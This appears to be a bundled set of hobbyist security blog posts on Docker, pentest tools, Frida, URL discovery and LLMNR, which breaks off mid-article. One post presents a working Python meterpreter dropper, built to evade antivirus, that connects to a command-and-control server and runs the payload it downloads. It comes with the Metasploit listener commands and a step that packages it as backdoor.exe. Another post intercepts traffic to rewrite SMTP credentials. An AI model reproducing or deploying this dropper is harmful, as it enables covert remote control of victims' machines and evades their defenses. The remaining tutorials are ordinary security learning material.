The only step left now is to see if the URL is still up, and if not, go to [https://archive.org/web/](https://archive.org/web/) and type in the URL.

### Thank you for reading, hope this helps you become more l33t H4x3r!`,te=`Creating a dockerfile
=====================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N44bChGtFeCYgHmp5_cUJw.png)


What is docker?
---------------




> “**Docker** is a set of [platform as a service](https://en.wikipedia.org/wiki/Platform_as_a_service) (PaaS) products that use [OS-level virtualization](https://en.wikipedia.org/wiki/OS-level_virtualization) to deliver software in packages called _containers_.” -wikipedia

The key difference between a vm and a docker container is that docker virtualizes operating system and a virtual machine hardware

### What is a dockerfile?

Dockerfile file is a list of instruction on how to build the container correctly, this can be handy for example web servers since with a dockerfile you can make instructions to copy the website html from the host (bare metal) system to the container running a webserver.

### How to run docker containers?

To run a docker container first you need to install docker:

\`apt install docker.io\`

[Docker hub](https://hub.docker.com/) is a place where you can find “images” for different applications and os’s. Here’s an example how to run python3 image:

1.  Go to docker hub and search “python”

2. Click on the “official” python one. now you should see a page like this:

3. For the third step copy the command from the docker hub site (“docker pull python”) and run it. This **downloads** the image to your system so that you can run it.

4. Now everything you have to do is run it, you can do that by running this commmand:\`docker run -it python\`

\`-i ==> interactive\`

\`-t ==> Allocate a pseudo-TTY\`

You should now have a python shell in front of you. Now that you know the basics of docker we can get into writing a dockerfile.

### Writing a dockerfile

Create a new directory and create a file named “Dockerfile” in a text editor of your choice and write the commands below to the file.

\`FROM ubuntu\`

Loads ubuntu image as the virtual environment.

\`RUN mkdir /home/user1\`

Runs “mkdir /home/user1” **inside the virtual ubuntu container**

\`WORKDIR /home/user1\`

When you log into ubuntu you’ll start at /home/user1

\`COPY /tmp/work.txt /home/user1/work.txt\`

Copies tmp/work.txt from your **host computer** to /home/user1/work.txt

Save these lines to the “Dockerfile” file. make a directory called “tmp“ in the directory where you saved the Dockerfile file and put some text into a file called “work.txt” inside the tmp directory.

Now we need to build the dockerfile to actually run it. To do that run this command in the directory where the Dockerfile is located:

\`docker build ./\`

You should get an id that looks something like 2fe57279559a. To run the container you need to run the command:

\`docker run -it <the container id>\`

You should see something like this if you did everything correctly:

![captionless image](https://miro.medium.com/v2/resize:fit:684/format:webp/1*KaRPIkw27E1hnNJPsurtHQ.png)

If you want to read more about dockerfile commands, here is a great cheatsheet: [https://gist.github.com/githubfoam/181b4b95e1cdad3caee3f429a66c521c](https://gist.github.com/githubfoam/181b4b95e1cdad3caee3f429a66c521c)

### **Thank you for reading ❤**`,E=`Automating web pentesting with jaeles
=====================================


Jaeles overview
---------------





Jaeles is an application designed to **automate** certain tasks in web application pentesting for example: fuzzing url parameters, checking for common php backdoors, testing out default credentials on a site protected by basic auth

### What signatures?

Jaeles uses “signatures” as instructions to create a request and detect if it’s vulnerable or not, you could for example create a signature to request /.htpasswd and if the status code is 200 it would mark it as “VULNERABLE” and alert the user. Jaeles signatures are yaml code which is known to be very sensitive to extra spaces etc… and will throw errors for everything.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ESCeE0caYu_neRgF)

if you want to create a jaeles signature yourself visit the documentation here: [https://jaeles-project.github.io/signatures/](https://jaeles-project.github.io/signatures/)

here’s the repo for default signatures provided by the vendor: [https://github.com/jaeles-project/jaeles-signatures/](https://github.com/jaeles-project/jaeles-signatures/)

Here are my sad collection of 2 jaeles signatures i made: https://github.com/Varppi/jaeles-custom-signatures

### Getting started

First you of course need to install jaeles, you can do that by either compiling it yourself or my recommended way of downloading the precompiled one.

From source: [https://jaeles-project.github.io/installation/](https://jaeles-project.github.io/installation/)

Precompiled: [https://github.com/jaeles-project/jaeles/releases](https://github.com/jaeles-project/jaeles/releases) (it in a zip file, unzip it and just copy it to /usr/bin)

Jaeles can be used in multiple ways

*   to analyze local code
*   using burpsuite plugin to send requests to jaeles
*   actively scanning urls(we’re gonna focus on this)

in jaeles you can provide urls in 2 ways \`-u\` which loads only one url (used like this:\`jaeles -u [https://example.com](https://example.com))\`[)](https://example.com)) and -U where you provide a **list** of urls (used like this: \`jaeles -U url_list\`). the signatures are provided with the -s which can load a single signature or if you provide a directory it will run all the signatures **inside the directory**

Here are some examples for of jaeles:

_Disclaimer: some signatures have “level” and you need to provide -L <level> to run it, otherwise jaeles will ignore it, for example if a signature has a line like this “Level: 4” you need to add_ \`_-L 4_\` _to your command_

\`jaeles scan -U url_list -s jaeles-signatures/sensitive/dot-secret-no-ext.yaml -L 2\`

\`jaeles scan -u [https://example.org/?search=fo](https://example.org/?search=fod)od -L 4 -s jaeles-signatures/fuzz/sqli\`← runs all signatures in this directory

If you want to see every request (even ones where vulnerability wasn’t found) use the verbose mode \`-v\`

If jaeles detects a vulnerability you should see something like this:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KAdQVxwFB2X_wPtpWc00lw.png)

All results are saved in the “out” folder where you can see the logs, the requests and responses.

\`$ls out/ jaeles-summary.txt testphp.vulnweb.com vuln-summary.txt\`

This is very handy because you can easily give this to the company’s it team and they can reproduce the exploit since the request, it’s data and headers are neatly saved.

### some thoughts

Jaeles is great for automatically testing against many targets and saves time in a pentest. It’s also great for quickly checking large amount of company sites against new (and old) vulnerabilities since the potential of signatures are almost limitless you can create almost anything with them! If you want to support the project i urge you create and upload your own signatures to github.`,ne=`Keeping notes during an assessment
==================================


why would you keep notes?
-------------------------




Keeping notes during a pentest/bug bounty assessment is essential because today’s technology is so complex that if you just try store scan results in your memory you’re 100% going to miss something or waste your time scanning targets again and again because you want to verify something (for example a version number).

**How to keep notes? (theoretical)**

There are a lot of different ways to keep notes, here’s **my** list from **best to worst**

*   Checklist/note keeping (Joplin, notion, obsidian, etc…)
*   Mind maps (Gitmind, Xmind, Lucidchart, etc…)
*   Keeping results in file system like nmap.txt, subdomains.txt
*   Brain
*   Nothing

I personally like Joplin the best since it can be edited quickly and is easy to import,export.

Checklists and notes should be

*   very detailed
*   easy to read
*   done in a logical order (not scanning subdomains before even port scanning the main domain)

this helps minimize lost time and to provide the best value to your customers (company’s IT team).

If you don’t want or have the time to make one for yourself, you can download a pre-made checklist from example Github.

**Keeping notes with Joplin**

To start conducting pen tests like a professional first you need a note keeping application (I’m going to focus on Joplin)

Installing Joplin (NO ROOT):

\`**wget -O - https://raw.githubusercontent.com/laurent22/joplin/master/Joplin_install_and_update.sh | bash**\`

Importing checklists:

1.  Open Joplin
2.  Navigate to “file” menu located at top left of the window
3.  Click on import
4.  Select the file-type of the checklist you’re trying to import
5.  Import the checklist

Joplin documentation: [https://joplinapp.org/help/](https://joplinapp.org/help/)

I suggest you experiment with other note keeping apps as well to find one that fits you.

### Thank you for reading!`,re=`Intro to command-line arguments
===============================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*fq8nh1SRlJrGuziZ.png)





### **Intro**

For small scripts, getting arguments by simply appending the argument you want to supply after the program like this: ”python3 main.py argument1" might be fine, but if you want to make a program that has to get a lot of arguments, then this method becomes very difficult and tedious to implement and use. This is where command-line flag arguments come in, instead of the user having to remember in which order the arguments needed to be, flag arguments allow the user to give the arguments in a more natural and easy way. Like this:

\`\`\`
python3 main.py --username peter --password password1234
\`\`\`

### **Prerequisites**

*   **Python3 basic’s**
*   **You need to have python3 and argparse module installed.**

\`\`\`
apt install python3 python3-pip
pip3 install argparse
\`\`\`

### **Getting started**

Import the module.

\`import argparse\`

Create the argparser:

\`arg_parser = argparse.ArgumentParser()\`

Add a **not required** argument named “target” or anything you want.

\`arg_parser.add_argument(‘-t’, ‘--target’, help=”Target to scan”)\`

*   ‘-t’ ← The flag (would be called like \`python3 <prog> -t <target>\`).
*   ‘ — target’ ← Same as -t but most importantly this will be the name of the variable (arguments.target). If we only had ‘-t’ the variable would be arguments.t
*   ‘help’ ← This will show up when you request a help page for the flag (\`python3 program --help\` or \`python3 program -h\`)
    example help page: \`-t TARGET, --target TARGET Target to scan\`

_To add a_ **_required_** _flag (meaning it will throw an error if it’s not provided) just add “required=True” to the add_argument’s arguments._

Export all arguments.

\`arguments = arg_parser.parse_args()\`

Now everything is finished! You can now just retrieve the arguments like this:

\`print(arguments.target)\`

The program should now look like this:

\`\`\`
import argparse
arg_parser = argparse.ArgumentParser()
arg_parser.add_argument(‘-t’, ‘--target’, help=”Target to scan”)
arguments = arg_parser.parse_args()
print(arguments.target)
\`\`\`

_Note: You can add as many arguments as you want._

One with more than 1 argument:

\`\`\`
import argparse
arg_parser = argparse.ArgumentParser()
arg_parser.add_argument(‘-t’, ‘--target’, help=”Target to scan”)
arg_parser.add_argument(‘-p’, ‘--port’, help=”Port to scan”)
arguments = arg_parser.parse_args()
print(arguments.target)
print(arguments.port)
\`\`\`

### Thank you for reading!`,ie=`Modifying packets on the fly (python)
=====================================



**Intro**
---------




I was playing around with ARP spoofing but when I tried to find info about modifying the actual data, it was pure hell. So I’m making to article to maybe help someone who is in the same situation I was in back then.

### Let’s get started!

Linux has something called “nfqueue”. nfqueue stops packets and waits for a program to let them pass. While in this queue, we can modify the contents of the packet. More about nfqueue: [https://home.regit.org/netfilter-en/using-nfqueue-and-libnetfilter_queue/](https://home.regit.org/netfilter-en/using-nfqueue-and-libnetfilter_queue/)

Here’s the most basic syntax in python:

\`\`\`
from netfilterqueue import NetfilterQueue as nfq
from scapy.all import *def packet_listener(packet):
  scapy_packet = IP(packet.get_payload())
  print(scapy_packet.show())
  packet.accept()
queue = nfq()
queue.bind(1, packet_listener)
queue.run()
\`\`\`

The script above first sets up a nfqueue bind to “1” (which will be important later) and waits for packets. When a packet arrives the program will convert it into a scapy packet, displays the contents aka headers, data, etc… of the packet and “accepts” it aka it let’s the packet through.

\`\`\`
from netfilterqueue import NetfilterQueue as nfq
from scapy.all import *def packet_listener(packet):
 scapy_packet = IP(packet.get_payload())
 if scapy_packet.haslayer("UDP"):
  if scapy_packet.haslayer("Raw") and scapy_packet[UDP].dport == 25:
   if "user:" in scapy_packet[Raw].load.decode('latin-1').lower():
    scapy_packet[Raw].load = b"USER:lolz"
   if "pass:" in scapy_packet[Raw].load.decode('latin-1').lower():
    scapy_packet[Raw].load = b"pass:lolz"
 packet.set_payload(bytes(scapy_packet))
 packet.accept()
queue = nfq()
queue.bind(1, packet_listener)
queue.run()
\`\`\`

This script switches all SMTP credentials to “lolz”

To actually enable the queue you have to enter this command (root):

\`\`\`
iptables -I INPUT -j NFQUEUE --queue-num 1
\`\`\`

or -I OUTPUT to stop all the **outgoing** packets.

The \`--queue-num 1\` defines the id for the queue, this can be seen in all the python scripts as \`queue.bind(1, packet_listener)\` .

### Thank you for reading!`,ae=`Bypassing all known anti virus applications (Python meterpreter)
================================================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*jYhcCyqPPqup1Lnl)





Theory section
--------------

### Overview

I read trough Metasploits “python/meterpreter/reverse_tcp_ssl” payload and coded my own version of it, when I was testing it out I realized that AVs (Anti Virus) couldn’t detect the full payload stored in ram and only detected the dropper so basically, if you just make enoughy changes to the dropper, the backdoor isn’t detected.

### How meterpreter works

1.  Dropper connects to server
2.  Server sends the length of the backdoor
3.  Server sends the payload in chunks
4.  Dropper base64 decodes the complete payload
5.  Dropper uses zlib to decompress the base64 decoded payload
6.  This step depends on the type of payload (exe,py,bash,etc…)
7.  **!!EXECUTION!!**

Backdooring
-----------

### **Code (run in the target system)**

This is the code I used as a POC (if you’re not reading this in 2022 someone has probably already uploaded the code below to an AV database so you gotta make some changes)

Github link:https://github.com/Varppi/python-meterpreter-av-bypass

\`\`\`
import socket 
import ssl   
import os
import threading
import time
import zlib
import base64
import struct
c2 = 'localhost' #Command and control server ip/hostname
port = 443 #Port to connect to (443 to mask the encrypted traffic as https traffic)
context=ssl._create_unverified_context()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
    with context.wrap_socket(sock, server_hostname=c2) as ssock:
         ssock.connect((c2, port))
         sent = struct.unpack('>I',ssock.recv(12000))[0]
         payload = ssock.recv(sent)
         while len(payload) < sent:
            payload += ssock.recv(sent-len(payload))
         exec(zlib.decompress(base64.b64decode(payload)), {'s':ssock})
\`\`\`

### Msfconsole commands (listener)

\`\`\`
use multi/handler
set payload python/meterpreter/reverse_tcp_ssl
set LPORT 443
set LHOST 0.0.0.0
run
\`\`\`

### Converting py to exe (located in dist/backdoor.exe after running the command below)

\`\`\`
pyinstaller -F backdoor.py
\`\`\``,oe=`Get real IP behind a Reverse Proxy
==================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*x4wTCAtjB5qpvD89)



Overview
--------





During pentests or just general tinkering around with websites you might have noticed that a lot of websites are pointing to “CloudFlare” or “Akamai” servers. These are called **Reverse Proxies**, they route traffic trough their servers to the actual web server to protect sites against for example DDOS attacks. This article aims to help you reveal the real IP behind them.

### Technique 1. Subdomains

When setting up a reverse proxy it is for a specific domain name and if the server has subdomains they might leak the real IP if the subdomain isn’t routed trough a reverse proxy. Here are some tools and sites to find subdomains for domain:

*   DNSdumpster ([https://dnsdumpster.com/](https://dnsdumpster.com/))
*   Censys Search ([https://search.censys.io/](https://search.censys.io/))
*   Sublist3r ([https://github.com/aboul3la/Sublist3r](https://github.com/aboul3la/Sublist3r))

### Technique 2. SSL Certificates

After setting up a reverse proxy, the real server behind it might still have the same SSL certificate so if we lookup all the IPs and domain names with the same certificate we might find the real IP. To discover everything tied to a certificate i recommend using **Censys Search (**[**https://search.censys.io/**](https://search.censys.io/)**)**

### Technique 3. DNS History

If the domain name has been in use without the reverse proxy there’s a considerable chance that the old IP of the server has been logged by a company for example SecurityTrails. Here are some sites to view the IP history of a domain name:

*   SecurityTrails ([https://securitytrails.com](https://securitytrails.com))
*   Complete DNS ([https://completedns.com/dns-history/](https://completedns.com/dns-history/))

More sites here:[https://woorkup.com/view-dns-history-free/](https://woorkup.com/view-dns-history-free/)

Tools:
------

[https://github.com/christophetd/CloudFlair](https://github.com/christophetd/CloudFlair)

[https://github.com/zidansec/CloudPeler](https://github.com/zidansec/CloudPeler)

[https://github.com/256o/CDNRECON](https://github.com/256o/CDNRECON)`,se=`Android pen testing with Frida
==============================

![captionless image](https://miro.medium.com/v2/resize:fit:800/format:webp/1*_vYqatAh7CNQs_USDvjqNQ.png)






### Overview

I got into android pen testing (still learning) and a big problem i found while using the popular dynamic instrumentation toolkit Frida is that there’s not much material out there so here’s so i hope that even a single human being found this article helpful.

### What is Frida

Frida is a free **dynamic instrumentation toolkit** that can be used for many things on various platforms but i’m gonna focus on Android at least for now. With Frida you can:

*   Read app memory (Full memory access)
*   Call methods/functions
*   Hook methods/functions

and much more!

### Installation prerequisites

*   **Rooted phone**
*   **Computer**
*   **Usb cable**

### Installation

To install Frida client on your computer you simply use python3-pip like this:

\`\`\`
pip install frida-tool
pip install frida
\`\`\`

To install Frida-server on you Android device:

1.  download the right binary from Frida’s github releases page ([https://github.com/frida/frida/releases](https://github.com/frida/frida/releases)) locally to your computer.
2.  Make sure you have installed **Android Debug Bridge** tools and have enabled USB debugging (tutorial: [https://www.xda-developers.com/install-adb-windows-macos-linux/](https://www.xda-developers.com/install-adb-windows-macos-linux/)).
3.  Run these commands on your computer while the phone is connected to your computer via an USB.

\`\`\`
adb root #Enables debugging via root (click accept on the phone)
adb push frida-server /data/local/tmp/ #Uploads the files
adb shell "chmod 755 /data/local/tmp/frida-server" #Changes file permissions
adb shell "/data/local/tmp/frida-server &" #Runs the binary as a background job
\`\`\`

### Usage

Frida can be used via a **command line or Python** but i’m gonna use command line version for the examples since it’s simpler. Command line syntax:

\`\`\`
frida -U  -l injection_script.js <process name or PID>
\`\`\`

-U → Tells Frida that the phone running the app is connected via USB.

-l → JS Script to inject (Docs: [https://frida.re/docs/javascript-api/](https://frida.re/docs/javascript-api/)).

-f → Instead of injecting itself into an existing process it starts the app (you have to provide a full name for example com.somecompany.someapp).

Typing an injection script
--------------------------

Frida supports 2 different languages to write the script in **JavaScript, TypeScript**. I’m using JavaScript but of course use either one you like better. To get started open the JS file and write this basic starting block of code:

\`\`\`
Java.perform(() => {
    console.log("Hello Universe!");
});
\`\`\`

**Breakdown:**

Java.perform → Part of the Frida JavaScript api which makes sure Frida is connected to the JVM (Java Virtual Machine)

console.log → Part of JavaScript (equal to print in Python)

### **Basic method hooking**

Target Android code (class is **com.app.my_activity**):

\`\`\`
public class my_activity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_my_activity);
        while (true){
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            fun(50,30);
        }
    }
    void fun(int x , int y ){
        Log.d("Sum" , String.valueOf(x+y));
    }
}
\`\`\`

Our mission is to hook the “fun” method and use console.log to see what arguments “onCreate” is trying to send. Let’s start with the JVM check:

\`\`\`
Java.perform(() => {
    
});
\`\`\`

After that we will “import” the target class (**com.app.my_activity**) so we can call all the methods, read global values, hook methods and all that good stuff (scroll down to see examples on how to call functions etc if you’re interested in learning it asap).

\`\`\`
const class1 = Java.use("com.app.my_activity");
\`\`\`

Our code after adding this:

\`\`\`
Java.perform(() => {
    const class1 = Java.use("com.app.my_activity");
});
\`\`\`

Next we will hook the method (“fun”) like we planned to. This can be done in multiple ways but i’m gonna show you the most basic one.

\`\`\`
class1.fun.implementation = function(argument1, argument2){
    //Code
};
\`\`\`

Here we tell Frida to hook “fun” method from the class com.app.my_activity (which we imported to the variable “class1") and that the method has 2 arguments (in the source code the names are x, y)

Code right now:

\`\`\`
Java.perform(() => {
    const class1 = Java.use("com.app.my_activity");
    class1.fun.implementation = function(argument1, argument2){
        //Code
    };
});
\`\`\`

Now we will just add the last part (printing out the argument values):

\`\`\`
console.log(argument1);
console.log(argument2);
\`\`\`

Final injection code:

\`\`\`
Java.perform(() => {
    const class1 = Java.use("com.app.my_activity");
    class1.fun.implementation = function(argument1, argument2){
        console.log(argument1);
        console.log(argument2);
    };
});
\`\`\`

Run the script by starting the target app on your phone (or use -f to start it when launching Frida) and you should see the arguments.

\`\`\`
frida -U -l inject.js "My app"
\`\`\`

### **NOTE: When you hook a method you basically override the original one so you need to return output manually using the “return” command**

CHEAT SHEET
-----------

### Calling methods

To call methods:

\`\`\`
const class1 = Java.use("com.myapp.unlockshit");
class1.unlock_screen(true);
\`\`\`

If you happen to get a “\`cannot call instance method without\` ” error, the reason for it is that the Java method you’re trying to call is not a static one ([https://www.codeunderscored.com/functions-in-java/](https://www.codeunderscored.com/functions-in-java/)), here’s how to fix it:

\`\`\`
const class1 = Java.use("com.myapp.unlockshit");
class_instance = class1.$new();
class_instance.unlock_screen(true);
\`\`\`

To resolve a “\`Error: a(): argument types do not match any of: .overload('java.lang.String')\`” error type what the error asks you to, after that add _.call(<arguments>)_ to the end of the line. In this case it looks like this:

\`\`\`
class.a.overload("java.lang.String").call(<arguments>);//<arguments> is not part of the code
\`\`\`

### Memory stuff

Putting a string into memory:

\`\`\`
const pointer = Memory.allocUtf8String("I am inside your ram stick");
\`\`\`

Reading a string from pointer (buffer size is optional):

\`\`\`
const string_read = pointer.readUtf8String(69);
\`\`\`

Making a pointer.

\`\`\`
const pointer = ptr(0xblablabla)
\`\`\`

### General tips

If you need to hook a method but still need it to return valid/not tampered data, here’s my method:

\`\`\`
Java.perform(() => {
    const class1 = Java.use("com.app.cryptography");
    class1.calculate_something.implementation = function(arg1){
        console.log(arg1);
        var output = this.calculate_something(arg1);
        return output
    };
});
\`\`\`

When you want to get a glimpse of a pointer and its content in hex, ascii you can use hexdump()

\`\`\`
console.log(hexdump(pointer));
\`\`\`

Thank you for reading, keep on learning!
----------------------------------------`,ce=`Debugging Android apps with AndBug
==================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*qi7QVahEBCmP3Qiu.png)





### Overview

Debugging apps can help you with understanding how the app works by seeing the calls in real time instead of reading statically trough the source code not knowing fully what functions will get called and when.

### What is AndBug?

AndBug is an android debugging tool which can

*   Set breakpoints
*   Trace classes and methods
*   List available classes and methods
*   Dump methods

### Installation

\`\`\`
git clone https://github.com/swdunlop/AndBug.git
cd AndBug
make
./andbug
\`\`\`

### Getting Started

To get started you can install Frida toolkit or other program that can get PID of the target process. On top of that you need to have USB debugging enabled on your phone, if you don’t know how to do this here’s a quick tutorial:[https://www.lifewire.com/enable-usb-debugging-android-4690927](https://www.lifewire.com/enable-usb-debugging-android-4690927)

Usage
-----

1.  Get app PID

\`\`\`
frida-ps -U |grep -i "app name"
\`\`\`

2. Launch AndBug

\`\`\`
./andbug shell -p PID_HERE
\`\`\`

3.Action time! type “help” to list all available commands.

### Examples

Listing all classes and methods

\`\`\`
./andbug shell -p 3435
classes
methods com.myapp.activity
\`\`\`

Tracing classes and threads

\`\`\`
./andbug shell -p 3453
ctrace com.myapp.activity
tthread thread_name
\`\`\`

Set breakpoint to a class and a method

\`\`\`
./andbug shell -p 6969
break b com.yomom.mainactivity
break b com.yomom.mainactivity$1
\`\`\`

### IK, nothing ground breaking but maybe this helped someone :D`,D=`Finding URLs (cyber sec)
========================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RCklZsIdLVyKPAj3Dm8KJQ.png)






Overview
--------

When pen testing or doing a bug bounty on a website it is useful to get a list of URLs that you can use later to get information or to scan for vulnerabilities. This article at least tries to help you find those URLs.

Tools
-----

*   **GAU (Get All Urls)**
*   **Crawley**
*   **GoSpider**

Installation (Debian linux)
---------------------------

**GAU:**

**_Note_**_: There’s a problem with GAU that when you install it with the name “GAU” it for some reason gives this error: “fatal: not a git repository (or any of the parent directories): .git” so this tutorial shows how to fix that problem by changing the name to “getallurls”_

\`\`\`
cd /tmp
wget -O gau.tar.gz https://github.com/lc/gau/releases/download/v2.1.2/gau_2.1.2_linux_amd64.tar.gz
tar xvf gau.tar.gz
mv gau /usr/bin/getallurls
rm gau
rm gau.tar.gz
\`\`\`

**Crawley:**

\`\`\`
git clone https://github.com/jmg/crawley
python3 setup.py install
\`\`\`

**GoSpider:**

\`\`\`
wget -O gospider.zip https://github.com/jaeles-project/gospider/releases/download/v1.1.6/gospider_v1.1.6_linux_x86_64.zip
unzip gospider.zip
mv gospider_v1.1.6_linux_x86_64/gospider /usr/bin
rm -rf gospider_v1.1.6_linux_x86_64*
\`\`\`

Usage
-----

**GAU:**

Syntax: targets |program options

\`\`\`
echo "https://website" |getallurls
cat urls |getallurls
cat urls |getallurls --threads 50 #Changes thread amount to 50
cat urls |getallurls --subs #Includes subdomains
\`\`\`

**Crawley:**

Syntax: program options target

\`\`\`
crawley http://example.com
crawley -js -depth -1 http://example.com #-js searches for endpoints in javascript files, -depth -1 sets how deep it will crawl to infinite
\`\`\`

**GoSpider:**

Syntax: program options target

\`\`\`
gospider -s http://example.com 
gospider -S url_list
gospider -s http://example.com -o gospider_format --json #The default output is hard to parse so JSON format is recommended
\`\`\`

### Combining all of these tools to get the best results

These tools mentioned are not that powerful alone but when you combine their results together they bring in considerable amount of value. To do this i have quickly put together a tool that does exactly this.

\`\`\`

#!/bin/bash
echo "GAU scan in progress..."
echo $1 |getallurls  --threads 20 > tmp_urls_SpofIMEI
echo "gospider scan in progress..."
gospider -s $1 --json -t 20 --robots --sitemap --js -d 0 |jq '.output' -c |cut -d \\"  -f 2 >> tmp_urls_SpoofIMEI
echo "crawley scan in progress..."
crawley -js -depth -1 -brute $1 2>/dev/null >> tmp_urls_SpoofIMEI
cat tmp_urls_SpoofIMEI |sort -u > urls_SpoofIMEI
rm tmp_urls_SpoofIMEI
echo "Done! Results saved at:urls_SpoofIMEI"
\`\`\`

Copy this or download it from github: [https://github.com/SpoofIMEI/get_urls](https://github.com/R00tendo/get_urls).

The results should look something like this:

Thank you for reading!
----------------------`,O=`Using Linux effectively (for cyber sec)
=======================================

![captionless image](https://miro.medium.com/v2/resize:fit:1200/format:webp/0*HRe3EmdmctDMoh3K)






Intro
-----

Learning to use Linux effectively by automating things is essential to not waste time. This article has all the best tricks and tools that I personally use to save time during engagements. I’m pretty sure hackers of almost all levels can get at least something out of this since there’s not that much content out there about this subject.

Tools
-----

### **_Ranger (file system navigation)_**

**_Ranger_** is a tool that is used to navigate the file system fast. It has a lot of key combinations that do different stuff like copying file path, changing working directory to the target directory etc, so you don’t have to touch your mouse.

**Installation**

\`\`\`
apt install ranger
\`\`\`

**Usage**

\`\`\`
ranger
\`\`\`

After opening ranger you should see something like this:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*q_3vmQd1mG3YvdchRLQzcA.png)

Now you can navigate the file system using the arrow keys or your mouse. Now that being said here’s a list of the most useful key combinations and what they’ll do:

*   To open files you just press **_ENTER_** after selecting the target file.
*   In general just type the first letter of the combination to see all the available combinations (for example type **_y_** or **_g_**)
*   **_yp_** to to copy the selected file PATH
*   **_yy_** copy
*   **_pp_** paste
*   **_!_** run system command
*   **_.f_** filter out only files
*   **_dD_** delete

### ack (searching text in big folders)

**_ack_** should be preinstalled in Kali Linux and it is used to search for patterns in large folders with a lot of files (for example if you use fff to store requests and responses of a site).

**Installation**

\`\`\`
apt install ack
\`\`\`

**Usage**

If you have ever experimented with ack before you probably have noticed that it is very similar to grep. This isn’t entirely wrong but ack is coded exactly for parsing techy things like JSON,HTML,XML etc… I tend to understand better from examples so I’m going to do just that.

Here we will search for “Server: Apache/2.4.49” in every single file that is in /projects/pentest/randomcompany/fff.

\`\`\`
ack "Server: Apache/2.4.49" /projects/pentest/randomcompany/fff
\`\`\`

If we don’t know which characters are capitalized we can use the **_-i_** argument to ignore case.

\`\`\`
ack -i someonesname /leaks/myspace_leaks
\`\`\`

These are cool and all but you might be wondering “but how does this differ from grep”. Well we’re getting into that right now.

When you want to get every script tag in a HTML file we can do something like this:

\`\`\`
ack --range-start='<script' --range-end='<\/script>' /html/files/
\`\`\`

Sometimes you need to even specify the content inside the tags, that can be achieved with this:

\`\`\`
ack --range-start='<title>' --range-end='<\/script>' -i "rest api" /html/files
\`\`\`

### gf (finding sensitive data)

**_gf_** is used to find sensitive information for example AWS-keys, s3-buckets from files.

**Installation**

\`\`\`
go get -u github.com/tomnomnom/gf
\`\`\`

**Usage**

gf can be used in two ways, piping data or providing a file.

To list all available filters:

\`\`\`
gf --list
\`\`\`

Examples:

\`\`\`
cat file |gf base64 #Lists everything resembling base64 encoded text
gf ssrf urls #Finds all urls that could have a ssrf vulnerability in the urls file
\`\`\`

### UnfURL (data formatting)

If you’re in a situation where you have a lot of URLs but need to get only the paths or parameters, then this is the solution for it. With UnfURL you can easily give it a list of URLs and tell what parts you want to parse from the URLs and let UnfURL handle the rest.

**Installation**

\`\`\`
go install github.com/tomnomnom/unfurl@latest
\`\`\`

**Usage**

\`\`\`
cat urls |unfurl domains #Get only domains names
cat urls |ụnfurl --unique paths #Show paths and remove duplicates
cat urls |unfurl json #Export all the URLs in json format
unfurl -h
\`\`\`

### Gron (JSON data formatting)

Gron is a very unique tool that converts JSON data into variable like format.

Here are 10 lines of random JSON data (censored because I’m not sure if the data is real):

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZmJN79ZGHZhkr2DEkRZJzQ.png)

Now here’s the output Gron gives me:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZH4Fl4qz3FiOmvNHm35ZLQ.png)

As you can see the JSON file has been converted into these variable looking things. This can be useful if you want to grep for multiple fields. You could also use jq .’field_name’ to do that as well.

**Installation**

\`\`\`
go install github.com/tomnomnom/gron@latest
\`\`\`

**Usage**

The most basic way:

\`\`\`
some_command |gron
gron file.json
\`\`\`

This approach is fine if the tool or file returns only **_ONE LINE_** of JSON but if you have more than one lines of JSON (I’m assuming you don’t have a new lines after { and }) you need to use the “-s” option like this:

\`\`\`
some_command |gron -s
gron -s file.json
\`\`\`

Storing results in an organized manner (my way)
-----------------------------------------------

When running million different scanners against a site while also doing some manual testing people usually forget to store the results so that they can be easily found and give concise answers. This leads to having to rerun the scans or forgetting to test something. If you felt a little pinch in your heart, then you should seriously think of how you could keep better notes.

I like to store all my findings in a tree like structure as a directory. Here’s an example of my typical bug bounty hunting directory:

\`\`\`
├── general_notes
├── informational
│   ├── tech_and_versions
│   └── urls
├── Scans
│   ├── nmap.txt
│   └── nuclei_results.txt
└── vulnerabilities
    └── cve-6969-6969
        ├── exploit.py
        └── how_to_exploit
\`\`\`

Here you can see that on top of the normal scan results etc I have a general_notes file that is kinda the core of the directory. It contains all the most juicy things like discovered credentials, vulnerable endpoints, very interesting parameters and that kind of stuff. This has worked for me really good so I recommend anybody who doesn’t have a better system in place to at least try it out and see if you like it.`,le=`LLMNR and LLMNR poisoning in depth
==================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*LqTEJxrTuDI10WUV)





LLMNR Basics
------------

LLMNR (Link-Local Multicast Name Resolution) is the Windows successor for NBT-NS (still used in legacy devices or as a backup if LLMNR fails) that functions as like a internal DNS service if there’s no DNS or the DNS server doesn’t have the device’s IP.

**Here are some terminology you have to know beforehand:**

LLMNR Has 2 types of packets:

*   LLMNR query: Requests either a specific device or everyone in the network to send the IP for a specific name/domain
*   LLMNR response: Responds to a query with an IP

### Resolving name using LLMNR step by step:

Lets say computer_A is trying to access a SMB share at //fileserver1/files . Before being able to do this, computer_A needs to resolve fileserver1 to the corresponding IPv4 (or v6) to know where it should send all the packets.

1.  Computer_A: Checks local cache
2.  Computer_A: Checks if DNS is available and if the any of the DNS servers has the IP. If not, then continue to the following stages:
3.  Computer_A: Sends LLMNR Query for name “fileserver1” to 224.0.0.252 (broadcast address)
4.  Computer_B: Sends LLMNR Response for name “fileserver1” saying the IPv4 is 192.168.1.29

3. Computer_A: Receives the IPv4 and connects to the server.

Here’s a picture to help you visualize it:

LLMNR Poisoning
---------------

### Theory

